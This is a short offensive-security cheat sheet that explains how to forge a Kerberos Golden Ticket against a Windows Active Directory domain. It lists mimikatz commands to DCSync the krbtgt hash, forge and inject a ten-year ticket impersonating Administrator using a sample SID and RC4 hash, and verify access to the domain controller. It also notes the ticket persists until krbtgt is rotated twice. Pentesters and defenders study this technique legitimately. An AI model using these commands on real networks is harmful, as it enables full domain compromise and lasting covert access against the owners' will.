# 09.06 Golden Ticket Windows

> Forge a 10-year TGT signed with the krbtgt hash via `mimikatz kerberos::golden /ptt` — arbitrary group memberships for any user.

## Overview

The Golden Ticket forges a TGT signed with the krbtgt NT hash, granting arbitrary group memberships for any user (real or fictitious) with a default 10-year lifetime. Prerequisites are domain name, domain SID (Get-DomainSID), krbtgt NT hash (lsadump::dcsync /user:krbtgt), and the username to impersonate. Mimikatz kerberos::golden with /ptt injects the ticket immediately; /ticket:file.kirbi saves it for later use.

## Steps

- Retrieve the domain SID with PowerView Get-DomainSID.
- DCSync the krbtgt hash with mimikatz lsadump::dcsync /user:krbtgt /domain:<DOMAIN>.local.
- Forge and inject the Golden Ticket with mimikatz kerberos::golden /domain /user /sid /rc4 /ptt.
- Confirm the ticket with klist; use Enter-PSSession or dir \\dc01\c$ to verify access.
- Persistence note: the ticket is valid until krbtgt password is rotated twice with domain convergence between resets.

## Commands

### PowerView get domain SID

```powershell
Import-Module .\PowerView.ps1
```

### Mimikatz DCSync krbtgt hash

```powershell
mimikatz # lsadump::dcsync /user:krbtgt /domain:<DOMAIN>.local
```

### Mimikatz forge Golden Ticket

```powershell
mimikatz # kerberos::golden /domain:<DOMAIN>.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```

### Use Golden Ticket for WinRM

```powershell
Enter-PSSession dc01
```
